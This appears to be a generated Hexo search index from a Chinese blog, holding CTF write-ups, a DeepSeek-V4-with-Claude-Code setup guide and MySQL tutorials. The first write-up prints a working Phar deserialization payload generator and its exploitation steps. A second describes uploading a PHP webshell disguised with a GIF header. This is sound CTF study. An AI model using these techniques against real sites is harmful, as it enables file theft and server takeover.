@@ -1,0 +1,2527 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>SimplePHP,Phar反序列化</title>
+    <url>/2026/05/19/BUUOJ-web3-Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[题目入口打开题目是一个 Bootstrap 导航栏，有三个页面：首页、查看文件、上传文件。页面底部有一个注释 &lt;!--flag is in f1ag.php--&gt;，提示 flag 在 f1ag.php 中。
+查看文件的链接是 file.php?file=，参数为空，猜测存在文件包含漏洞。
+源码审计先尝试直接读 file.php 的源码，在 ?file=file.php 中看到它引入了 function.php 和 class.php：
+// file.phpinclude &#x27;function.php&#x27;;include &#x27;class.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;);$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;;if(empty($file)) &#123;    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;$show = new Show();if(file_exists($file)) &#123;    $show-&gt;source = $file;    $show-&gt;_show();&#125; else if (!empty($file))&#123;    die(&#x27;file doesn\&#x27;t exists.&#x27;);&#125;
+
+核心逻辑：通过 Show 对象的 _show() 方法来展示文件。继续读 class.php：
+// class.phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;            die(&#x27;hacker!&#x27;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;    &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;
+
+再看看 function.php 中的上传逻辑：
+// function.php 核心逻辑function upload_file_do() &#123;    global $_FILES;    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);&#125;function upload_file_check() &#123;    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);    $extension = end($temp);    if(in_array($extension,$allowed_types)) &#123;        return true;    &#125;    // ...&#125;
+
+代码分析
+_show() 方法的过滤：正则 /http|https|file:|gopher|dict|\.\.|f1ag/i 阻止了直接读取 f1ag.php，常规的 php://filter 伪协议也会因为 file_exists() 检查失败而无法使用。
+
+__construct 中的注释：//$this-&gt;source = phar://phar.jpg，强烈暗示了 Phar 协议的方向。
+
+Test 类中的 file_get()：直接调用 file_get_contents() 读取任意文件并用 base64_encode() 返回，没有任何过滤，是整个攻击链的终点。
+
+上传限制：只检查后缀名，不检查文件内容，可以上传任意内容的 .jpg &#x2F; .gif &#x2F; .png 文件。这正好可以上传 Phar 文件。
+
+文件名规律：md5(原始文件名 . 客户端IP) . &quot;.jpg&quot;，可预测。
+
+
+POP 链分析从终点往起点倒推：
+
+
+
+步骤
+方法
+触发条件
+作用
+
+
+
+终点
+Test::file_get()
+__get() 调用
+读取任意文件，base64 返回
+
+
+4
+Test::__get(&#39;source&#39;)
+访问不存在的 source 属性
+调用 get(&#39;source&#39;)，$params[&#39;source&#39;] 设为目标文件
+
+
+3
+Show::__toString()
+对象被当作字符串
+$this-&gt;str[&#39;str&#39;]-&gt;source 触发 Test 的 __get
+
+
+2
+C1e4r::__destruct()
+对象销毁
+echo $this-&gt;test 触发 Show 的 __toString
+
+
+起点
+Phar 反序列化
+phar:// 协议解析
+触发 __destruct 启动整条链
+
+
+完整调用链：
+phar://upload/xxx.jpg  → 反序列化 C1e4r 对象  → 销毁时调用 C1e4r::__destruct()  → echo Show 对象 触发 Show::__toString()  → $this-&gt;str[&#x27;str&#x27;]-&gt;source 触发 Test::__get(&#x27;source&#x27;)  → Test::get(&#x27;source&#x27;) 调用 file_get(&#x27;/var/www/html/f1ag.php&#x27;)  → base64_encode(file_get_contents(&#x27;f1ag.php&#x27;))  → 输出 base64 编码的源码
+
+构造 Payload&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;// 搭建 POP 链$test = new Test();$test-&gt;params = array(&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;);$show = new Show();$show-&gt;str = array(&#x27;str&#x27; =&gt; $test);$c1e4r = new C1e4r();$c1e4r-&gt;str = $show;// 创建 Phar 文件，伪装成 GIF@unlink(&quot;payload.phar&quot;);@unlink(&quot;payload.jpg&quot;);$phar = new Phar(&quot;payload.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();rename(&quot;payload.phar&quot;, &quot;payload.jpg&quot;);
+
+运行前需要关闭 phar.readonly：
+php -d phar.readonly=0 gen_phar.php
+
+利用过程
+上传 payload.jpg（后缀 .jpg 通过扩展名检查），上传后文件路径为 upload/md5(payload.jpg + IP).jpg
+
+通过 file.php?file=phar://upload/&lt;hash&gt;.jpg 触发 Phar 反序列化
+
+POP 链自动执行，页面返回 f1ag.php 的 base64 编码内容
+
+解码得到 flag：
+
+
+PD9waHAgDQoJLy8kYSA9ICdmbGFnezcyODkzNmNiLWUxMTUtNDIyOS1iOTliLTE3ODFjNzc2NDdiMn0nOw0KID8+DQoNCg==
+
+解码后：
+&lt;?php//$a = &#x27;flag&#123;728936cb-e115-4229-b99b-1781c77647b2&#125;&#x27;;?&gt;
+
+总结这道题考察的知识点：
+
+PHP 文件包含漏洞与常见过滤的绕过
+Phar 反序列化的原理与利用条件（phar:// 协议 + file_exists 等文件操作函数触发）
+
+以下文件传入phar://任何文件 可以触发phar反序列化文件存在性检查​​  file_exists(), is_file(), is_dir(), stat() ​​文件内容读取​​  file_get_contents(), fopen(), readfile() ​​文件信息获取​​ filesize(), filectime(), filemtime() ​​目录操作​​ fileatime(), scandir(), opendir() ​​其他文件操作​​ unlink(), copy()
+
+POP 链的构造思想——从危险函数（file_get_contents）倒推，利用各种魔术方法（__destruct → __toString → __get）串联调用链
+上传功能的扩展名绕过（黑名单不严 + 内容不检查）
+
+Phar 反序列化的关键在于：只要有一个能操作文件的函数（file_exists、file_get_contents、include 等）的参数可控，且 Phar 文件能被上传到服务器，就能触发反序列化漏洞。
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CV Maker[WUSTCTF2020]文件上传漏洞</title>
+    <url>/2026/05/07/CV-Maker-WUSTCTF2020-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[进入题目发现并没有文件上传功能，正常注册登录试试
+注册登录后，发现文件上传功能，尝试上传php文件,然后抓包把Content-Type改为图片格式
+上传失败，判断应该是白名单过滤，且对文件内容进行了检测，在文件前加上GIF89a图片头
+上传成功，用图片码也可以，把一个正常图片与php木马文件合成一个木马图片，上传再改文件后缀为.php用蚁剑连接，在目录中找到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DeepSeek V4 在 Claude Code 上的部署与使用指南</title>
+    <url>/2026/05/16/DeepSeek-V4-%E5%9C%A8-Claude-Code-%E4%B8%8A%E7%9A%84%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[引言2026 年 4 月 24 日，DeepSeek 正式发布了 DeepSeek-V4 预览版并同步开源。这是自 R1 发布 15 个月后的重大更新，推出了两个版本：V4-Pro 和 V4-Flash。V4 系列在 Agent 能力、超长上下文和推理性能上逼近甚至部分超越了顶级闭源模型，同时以极低的价格和完全开源策略推动 AI 普惠化。
+最令人兴奋的是，DeepSeek V4 原生兼容 Anthropic 的 API 协议，这意味着我们可以直接将 Claude Code 的后端切换为 DeepSeek V4，在享受 Claude Code 优秀的 Agent 循环的同时，大幅降低成本。
+
+
+DeepSeek V4 核心特性百万级超长上下文（1M Tokens）全系列标配 100 万 Token 上下文长度，约可处理 75 万汉字，足以一次性读入《三体》三部曲体量的内容。这得益于全新的 DSA 稀疏注意力（DeepSeek Sparse Attention）机制，在 token 维度进行压缩，大幅降低计算和显存需求。V4-Pro 处理 1M token 时仅需 V3.2 模型 27% 的算力和 10% 的内存。
+Agent 能力大幅提升在 Agentic Coding 评测中达到开源模型最佳水平。DeepSeek 内部已将其作为员工的编程助手使用，体验优于 Sonnet 4.5，交付质量接近 Opus 4.6 非思考模式。针对 Claude Code、Cursor、Codex 等主流 Agent 产品进行了适配优化。
+推理与知识性能
+世界知识：大幅领先其他开源模型，仅稍逊于 Gemini-Pro-3.1
+推理性能：在数学、STEM、竞赛型代码评测中超越所有已公开开源模型，比肩 GPT、Claude、Gemini 顶级闭源模型
+总参数 1.6 万亿（V4-Pro），激活参数 490 亿
+
+极致性价比
+
+
+模型
+输入价格（&#x2F;百万 tokens）
+输出价格（&#x2F;百万 tokens）
+
+
+
+V4-Pro
+$0.44
+$0.87
+
+
+V4-Flash
+~$0.14
+~$0.28
+
+
+Anthropic Opus
+$3.00
+$15.00
+
+
+V4-Flash 的价格不到 GPT-5.5 输出定价的 1%，真正实现了”白菜价”。
+在 Claude Code 上部署 DeepSeek V4DeepSeek V4 原生兼容 Anthropic 的 API 协议，部署过程非常简单，无需任何第三方工具。
+方法一：直接替换后端（推荐）这是最简单的方式，只需设置几个环境变量即可。
+步骤 1：获取 DeepSeek API Key前往 DeepSeek 官网 注册账号并创建 API Key。
+步骤 2：配置 Claude Code创建或编辑 Claude Code 的设置文件 settings.json：
+&#123;  &quot;env&quot;: &#123;    &quot;ANTHROPIC_BASE_URL&quot;: &quot;https://api.deepseek.com/anthropic&quot;,    &quot;ANTHROPIC_AUTH_TOKEN&quot;: &quot;$&#123;DEEPSEEK_API_KEY&#125;&quot;,    &quot;ANTHROPIC_DEFAULT_SONNET_MODEL&quot;: &quot;deepseek-v4-pro&quot;,    &quot;ANTHROPIC_DEFAULT_HAIKU_MODEL&quot;: &quot;deepseek-v4-flash&quot;,    &quot;CLAUDE_CODE_SUBAGENT_MODEL&quot;: &quot;deepseek-v4-pro&quot;  &#125;,  &quot;model&quot;: &quot;deepseek-v4-pro&quot;&#125;
+
+也可以使用独立的设置文件启动：
+claude --bare --settings ./deepseek-settings.json
+
+步骤 3：设置环境变量# Windows PowerShell$env:DEEPSEEK_API_KEY = &quot;sk-your-api-key-here&quot;# Linux / macOSexport DEEPSEEK_API_KEY=&quot;sk-your-api-key-here&quot;
+
+方法二：使用 deepclaude 项目deepclaude 是一个开源项目，支持 DeepSeek V4 Pro、OpenRouter、Fireworks AI 等多种后端，号称比原生 Anthropic 便宜 17 倍。
+git clone https://github.com/aattaran/deepclaude.gitcd deepclaude# 按 README 配置即可
+
+方法三：使用 MCP 服务器优化DeepSeek-V4-Claude-Code-MCP 是一个开源的 MCP 服务器，利用 DeepSeek V4 的 1M-token 上下文能力，可以索引整个代码仓库，在仓库探索任务中实现 10-100 倍的 token 缩减。
+提供 Windows (.exe) 和 Mac (.dmg) 的一键安装程序，无需手动配置。
+使用体验与注意事项优势
+成本大幅降低：从每月 $200 降至约 $7，降幅达 95%
+超长上下文：1M tokens 可一次性处理大型代码库
+原生兼容：无需第三方桥接工具，Claude Code 的所有功能（Agent 循环、工具调用等）均可正常使用
+思考模式：支持 reasoning_effort 参数调整思考强度
+
+当前限制
+
+
+限制
+说明
+
+
+
+❌ 不支持图像
+V4 是纯文本模型，无法查看截图、UI 设计图、错误截图
+
+
+⏱️ 超时设置
+复杂任务建议设置 API_TIMEOUT_MS=600000
+
+
+🔄 旧接口即将停用
+deepseek-chat &#x2F; deepseek-reasoner 将于 2026-07-24 停用
+
+
+与 Sonnet 4.5 的对比评测根据社区实际使用反馈，DeepSeek V4-Pro 在以下方面表现突出：
+
+代码生成：质量接近 Opus 4.6
+问题分析：由于 1M 上下文，能更好地理解大型项目全貌
+工具调用：完全兼容 Claude Code 的工具循环
+速度：V4-Flash 响应速度极快，适合日常辅助编码
+
+总结DeepSeek V4 的发布标志着开源大模型的一个重要里程碑。通过简单配置即可将 Claude Code 的后端替换为 DeepSeek V4，以极低的成本获得接近顶级闭源模型的体验。无论是个人开发者还是小型团队，这都是一个极具吸引力的选择。
+
+参考链接：
+
+DeepSeek V4 官方文档
+claudecode-deepseek-stack
+deepclaude
+DeepSeek-V4-Claude-Code-MCP
+
+
+]]></content>
+      <categories>
+        <category>AI</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL命令(1)</title>
+    <url>/2026/03/29/MySQL%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[一.创建数据库1. 直接创建数据库（默认字符集和排序规则）create database 数据库名;
+
+2. 判断数据库是否存在，不存在则创建create database if not exists 数据库名;
+
+3. 指定字符集创建数据库create database 数据库名 character set 字符集;
+
+4. 指定字符集和排序规则创建数据库create database 数据库名 character set 字符集 collate 排序规则;
+
+字符集种类
+utf8mb3（支持中文，过时）
+utf8mb4（支持emoji表情，mysql8.0默认字符集）
+
+排序规则种类
+utf8mb3_general_ci（支持中文，过时）
+utf8mb4_general_ci（支持emoji表情，大小写敏感排序）
+utf8mb4_ai_ci（支持emoji表情，unicode排序,大小写和重音敏感排序,mysql8.0默认排序规则）
+utf8mb4_as_ci（支持emoji表情，unicode排序，大小写和重音敏感排序）
+
+注意:创建数据库时，字符集和排序规则必须一致(utf8mb3对utf8mb3_general_ci，utf8mb4对utf8mb4_general_ci)查看数据库字符集和排序规则show variables like &#x27;character_set_database&#x27;;show variables like &#x27;collation_database&#x27;;
+
+二.库的查看与切换1. 查看当前所有库show databases;
+
+2. 查看当前使用库select database();
+
+3. 查看指定库下的所有表show tables from 数据库名;
+
+4. 查看创建库的信息show create database 数据库名;
+
+5. 切换到指定库use 数据库名;
+
+注意:切换库后，当前会话库会改变，后续操作会默认在切换后的库下进行。所以要操作指定库下的表和数据前，需要先切换到该库。三.库的删除与修改1. 删除数据库drop database 数据库名;
+
+2. 判断数据库是否存在，不存在则删除drop database if exists 数据库名;
+
+3. 修改数据库字符集alter database 数据库名 character set 字符集;
+
+4. 修改数据库排序规则alter database 数据库名 collate 排序规则;
+
+5. 同时修改数据库字符集和排序规则alter database 数据库名 character set 字符集 collate 排序规则;
+
+
+四.表的创建1.基本格式create table [if not exists] 表名(列名 类型 [列可选约束][COMMENT&#x27;列可选注释&#x27;],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],列名 类型 [列可选约束][COMMENT&#x27;列可选注释’],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],#列之间使用,分割)[表可选约束][COMMENT‘表可选注释’];
+
+2. 实例create table if not exists book_lib(    book_id int primary key comment &#x27;图书id&#x27;,    book_name varchar(20) comment &#x27;图书名称&#x27;,    book_author varchar(20) comment &#x27;图书作者&#x27;,    book_price double(4,1) comment &#x27;图书价格&#x27;)charset=utf8mb4 coll=utf8mb4_ai_ci;
+
+介绍:创建了一个名为book_lib的表，包含图书id，图书名称，图书作者，图书价格四列，图书id为主键，图书价格为双精度浮点数，图书名称和图书作者均为varchar类型（最大长度为20个字符）。表的字符集为utf8mb4，排序规则为utf8mb4_ai_ci。五.表的数据类型1. 整数类型
+
+
+类型
+存储（字节）
+范围
+
+
+
+tinyint（mysql独有）
+1
+-128~127
+
+
+smallint（sql通用）
+2
+-32768~32767
+
+
+mediumint (mysql独有)
+3
+-16777216~16777215
+
+
+bigint（mysql独有）
+8
+-2^63~2^63-1
+
+
+int（sql通用）
+4
+-2^31~2^31-1
+
+
+注意：加上unsigned后，对应列数据变成无负号整数，范围大小不变，但最小值从0开始。例：stu_age tinyint unsigned COMMENT‘年龄字段,tinyint类型,无符号值从0开始’,stu_age tinyint COMMENT‘年龄字段,tinyint类型,无符号值从-128开始&#x27;,
+
+2. 浮点&#x2F;定点数类型
+
+
+类型
+存储（字节）
+范围
+
+
+
+float
+4
+-3^23~3^23
+
+
+double
+8
+-3^64~3^64
+
+
+stu_height float(4,1) unsigned COMMENT‘身高,保留一位小数,多位会四舍五入,无符号值从0开始’-- 比如180.66会被四舍五入为180.7
+
+注意：从MySQL 8.0.17 开始,不推荐使用非标准FLOAT(M,D)语法DOUBLE(M,D),未来版本中可能删除对它的支持。（支持unsigned修饰,添加修饰,只保留正值范围负值不会迁移到正值!）
+
+
+类型
+存储(字节)
+M(小数+整数位数)
+D(小位数)
+
+
+
+decimal(M,D)
+动态计算
+M最大为65
+D最大为30
+
+
+注意:DECIMAL类型的存储空间是可变的,它的存储大小受DECIMAL数据类型定义时指定的精度和规模影响。如果D小数位数为0,DECIMAL则值不包含小数点或小数部分。例：emp_salary DECIMAL(8,1) COMMENT ‘工资,小数加整数一共8位,保留一位小数,多位会四舍五入’
+
+3. 字符类型
+
+
+类型
+特点
+长度范围（字符）
+
+
+
+char(n)
+固定长度
+0&#x3D;&lt;n&lt;&#x3D;255
+
+
+varchar(n)
+可变长度
+0&#x3D;&lt;n&lt;&#x3D;65535
+
+
+text
+长文本
+0~65535
+
+
+tinytext
+微短文本
+0~255
+
+
+tinyblob
+微短二进制文本
+0~255
+
+
+blob
+二进制文本
+0~65535
+
+
+注意:
+varchar定义时，必须指定最大长度，否则会报错。char定义时，如果不指定最大长度，默认会指定最大长度为1。
+字符类型在存储时，如果数据长度小于最大长度，会在末尾填充空格。
+blob类型是一个二进制大对象，可以容纳可变数量的数据。
+
+4. 日期和时间类型
+
+
+类型
+大小（bytes）
+格式
+范围
+用途
+
+
+
+date
+3
+YYYY-MM-DD
+1000-01-01~9999-12-31
+日期值
+
+
+time
+3
+HH:mm:ss
+-838:59:59~838:59:59
+时间值
+
+
+datetime
+8
+YYYY-MM-DD HH:mm:ss
+1000-01-01 00:00:00 到 9999-12-31 23:59:59
+日期时间值混合
+
+
+year
+1
+YYYY
+1901~2155
+年分值
+
+
+timestamp
+4
+YYYY-DD HH:mm:ss
+1970-01-01 00:00:00 到 2038-01-19 03:14:07
+年分值
+
+
+注意:
+year类型有两位或者四位的表达形式,两位 00-69 &#x3D;2000-2069 70-99&#x3D;1970-1999
+时间类型就是一个特殊格式的字符串,插入数据的时候!,时间类型需要自动赋值,需要手动添加相关的设置
+
+扩展自动填写时间:
+插入默认添加时间
+
+datetime default current_timestamp ;
+
+修改默认更改时间(插入的默认时间)
+
+datetime default current_timestamp on update current_timestamp;
+实例：ACREATE TABLE t2(NAME VARCHAR (20),register_time DATETIME DEFAULT CURRENT_TIMESTAMP COMMENT&#x27;插入自动维护时间&#x27;,update_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;插入维护时间,修改数据自动维护时间&#x27;)
+
+创建t2表:注册日期 字段插入自动添加时间,更新数据不变(插入数据的时候,自动维护时间,后续修改数据,时间不变!)更新日期 字段插入自动添加时间,更新数据时间改变(插入数据需要自动维护时间,修改数据也需要维护时间!)
+六. 表的修改和删除1. 添加列alter table 表名 add 列名 类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
+2. 删除列alter table 表名 drop 列名;
+3. 修改列名alter table 表名 change 原列名 新列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
+4. 修改列类型alter table 表名 modify 列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
+5. 修改表名alter table 表名 rename 新表名;
+6. 删除表drop table [if exists] 表名;
+7. 清除表数据truncate table 表名;
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL命令(2)</title>
+    <url>/2026/04/01/MySQL%E5%91%BD%E4%BB%A4-2/</url>
+    <content><![CDATA[一.插入数据INSERT INTO 表名 (列名1,列名2,列名...)values (列值1值,列值2,列值3...);
+
+注意：- 插入数据的时候,列名和列值的顺序要一致!- 如果数据类型是字符串,要使用单引号包裹!
+二.查询数据1. 基本格式SELECT 列名1,列名2,列名... | * FROM 表名;
+
+*代表查询所有列
+
+2. 查询条件SELECT 列名1,列名2,列名... | * FROM 表名WHERE 列名 条件;
+3. where条件语句
+where 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。
+where 子句也可以运用于 SQL 的 delete 或者 update 命令。
+你可以使用 and 或者 or 指定一个或多个条件。
+
+实例：SELECT * FROM users WHERE username = &#x27;test&#x27;;# 查询username列数据为test的行的所有信息
+SELECT * FROM users WHERE username != &#x27;runoob&#x27;;# 查询username列数据不为runoob的行的所有信息
+SELECT * FROM products WHERE price &gt; 50.00;# 查询price列数据大于50.00的行的所有信息，同理可用 &lt;、&lt;=、&gt;=
+# 组合条件SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00; # 查询category列数据为Electronics且price列数据大于100.00的行的所有信息（交集）SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00; # 查询order_date列数据大于等于2023-01-01或total_amount列数据大于1000.00的行的所有信息（并集）
+# IN运算符SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;); # 查询country_code列数据为US、CA、MX的行的所有信息
+# NOT运算符SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;; # 查询category列数据不为Clothing的行的所有信息
+# BETWEEN运算符SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;; # 查询order_date列数据在2023年1月1日至2023年12月31日之间的行的所有信息
+注意：如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据.4. like子句
+like子句用于搜索数据库中的模式(模糊匹配)。
+LIKE 通常与 % 一同使用，类似于一个元字符的搜索。
+可以使用 and 或者 or 指定一个或多个条件。
+可以在 DELETE 或 UPDATE 命令中使用 WHERE…LIKE 子句来指定条件。
+
+实例：% 通配符（匹配任意一个或多个字符）SELECT * FROM customers WHERE last_name LIKE &#x27;S%&#x27;; # 查询last_name列数据以S开头的行的所有信息
+_ 通配符（匹配任意一个字符）SELECT * FROM products WHERE product_name LIKE &#x27;_a%&#x27;; # 查询product_name列数据第二字符为a的行的所有信息
+组合使用 % 和 _SELECT * FROM users WHERE username LIKE &#x27;a%o_&#x27;; # 查询username列数据第一个字符为a且倒数第二字符为o的行的所有信息
+不区分大小写的匹配SELECT * FROM employees WHERE last_name LIKE &#x27;smi%&#x27; COLLATE utf8mb4_general_ci; # 查询last_name列数据以smi开头的行的所有信息（不区分大小写）
+三. 数据更新1. 基本格式UPDATE 表名SET 列名1 = 列值1, 列名2 = 列值2, ...WHERE 列名 条件;
+2. 实例UPDATE ordersSET status = &#x27;Shipped&#x27;, ship_date = &#x27;2023-03-01&#x27;WHERE order_id = 1001;
+# 使用表达式更新值UPDATE productsSET price = price * 1.1WHERE category = &#x27;Electronics&#x27;;WHERE category = &#x27;Electronics&#x27;;# 以上 SQL 语句将每个属于 &#x27;Electronics&#x27; 类别的产品的价格都增加了 10%。
+四. 数据删除1. 基本格式（删除一行所有列数据）DELETE FROM 表名WHERE 列名 条件;
+2. 实例DELETE FROM ordersWHERE order_id = 1001;# 删除order_id列数据为1001的行
+五. union操作符1. union操作符用于合并两个或多个 SELECT 语句的结果集,并返回所有行,去除重复的行。(并集)2. 基本格式SELECT (列名1,列名2,列名... | *) FROM 表名 WHERE 条件UNION [ALL]        # UNION ALL不去除重复的行SELECT (列名1,列名2,列名... | *) FROM 表名 where 条件;
+3. 实例SELECT product_name FROM products WHERE category = &#x27;Electronics&#x27;UNIONSELECT product_name FROM products WHERE category = &#x27;Clothing&#x27;# 以上 SQL 语句将选择电子产品和服装类别的产品名称.
+六. order by 语句1. MySQL ORDER BY(排序) 语句可以按照一个或多个列的值进行升序（ASC）或降序（DESC）排序。2. 基本格式SELECT 列名1, 列名2, ...FROM 表名ORDER BY 列名1 [ASC | DESC], 列名2 [ASC | DESC], ...;
+3. 实例# 单列排序SELECT * FROM productsORDER BY product_name ASC;
+# 多列排序SELECT * FROM productsORDER BY product_name ASC, price DESC; # 先按第一个升序排序,在第一个排序相同时，再按第二个降序排序，可以用数字代替列名
+# 使用表达式排序SELECT product_name, price * discount_rate AS discounted_priceFROM productsORDER BY discounted_price DESC;# 按折扣后的价格降序排序
+七.分组查询1. GROUP BY 语句根据一个或多个列对结果集进行分组。在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。2. 基本格式SELECT 列名1, aggregate_function(列名2)FROM 表名WHERE 列名 条件GROUP BY 列名1;# 列名2为对分组后的每个组执行的聚合函数
+3. 实例
+
+
+通过分组计算男女生的成绩平均分
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL的配置</title>
+    <url>/2026/03/29/MySQL%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[一.下载从MySQL官网上下载第二个文件（约550MB）
+下载完后跟着系统默认指示操作（在指定文件存放地址的时候最好不要放在c盘（系统盘），MySQL后期占用内存大）操作完后点击finish按钮即下载完成二.配置环境变量刚下载完后是无法通过终端直接连接MySQL数据库的，要把MySQL设置成环境变量才行先进入高级系统设置，在进入环境变量，在系统变量中新建变量，命名MySQL_Home(随意命名)，变量值为C:\Program Files\MySQL\MySQL Server 8.0
+再编辑系统变量里的Path变量，新建一个变量%MySQL_Home%\bin(用%包裹刚创建的MySQL_Home变量可直接代表路径)
+注意：如果Path变量里已经有了类似于phpstudy集成环境自带的MySQL,一定要把新建的MySQL变量放在其前面，不然系统会优先调用phpstudy集成环境自带的MySQL客户端，导致客户端与服务端不匹配，ssh无法认证，从而无法连接数据库。（之前因为这个问题在实验室卡了一个下午加一晚上）
+
+在完成以上配置后就可以通过终端直接连接MySQL了
+三.安装可视化工具MySQL的可视化工具构建图形化界面可以让对MySQL的操作可视化，使操作更方便SQLyog是一个适合初学者的可视化工具，支持中文且不会自动补全命令，便于记忆操作命令下载地址
+
+上框输入操作命令，下框执行命令并可视化此时，MySQL的基本配置已完成]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL(3)</title>
+    <url>/2026/04/02/MySQL%E5%91%BD%E4%BB%A4-3/</url>
+    <content><![CDATA[一.用户管理1. 创建用户基本格式create user &#x27;username&#x27;@&#x27;localhost&#x27; identified by &#x27;password&#x27;;#&#x27;username&#x27;表示安创建的用尸的用尸名#&#x27;localhost&#x27;表示用户可以通过连接到MySQL服务器的本地主机,用‘%’表示允许来自任何主机的连接。#&#x27;password&#x27;表示要创建的用户的密码
+2. 删除用户基本格式drop user &#x27;username&#x27;@&#x27;localhost&#x27;;#&#x27;username&#x27;表示要删除的用户名
+3. 赋予用户权限基本格式grant 权限 on 数据库名.表名 to 用户名@主机名# 多个权限之间用逗号隔开# 数据库名和表名用*代替分别代表所有数据库和所有表# all privileges 表示赋予所有权限
+实例GRANT SELECT, INSERT ON database_name.table_name TO &#x27;username&#x27;@&#x27;localhost&#x27;;# 给予用户名=username的用户数据库database_name的表table_name的SELECT和INSERT权限
+4. 取消用户权限基本格式revoke 权限 on 数据库名.表名 from 用户名@主机名
+实例REVOKE SELECT, INSERT ON database_name.table_name FROM &#x27;username&#x27;@&#x27;localhost&#x27;;# 取消用户名=username的用户数据库database_name的表table_name的SELECT和INSERT权限
+
+5. 查看用户权限基本格式show grants for 用户名@主机名
+实例SHOW GRANTS FOR &#x27;username&#x27;@&#x27;localhost&#x27;;# 查看用户名=username的用户的所有权限
+权限列表
+
+
+权限
+描述
+
+
+
+all privileges
+赋予所有权限
+
+
+select
+查询
+
+
+insert
+插入
+
+
+update
+更新
+
+
+delete
+删除
+
+
+create
+创建
+
+
+drop
+删除
+
+
+alter
+修改
+
+
+二.数据的约束1. 约束类型
+
+
+约束
+描述
+
+
+
+not null
+不允许为空
+
+
+unique
+唯一
+
+
+primary key
+主键
+
+
+default（默认值）
+当列为空时，显示默认值
+
+
+2. 在创建表时添加约束基本格式create table 表名 (    列名 数据类型 约束,    列名 数据类型 约束,    ...);
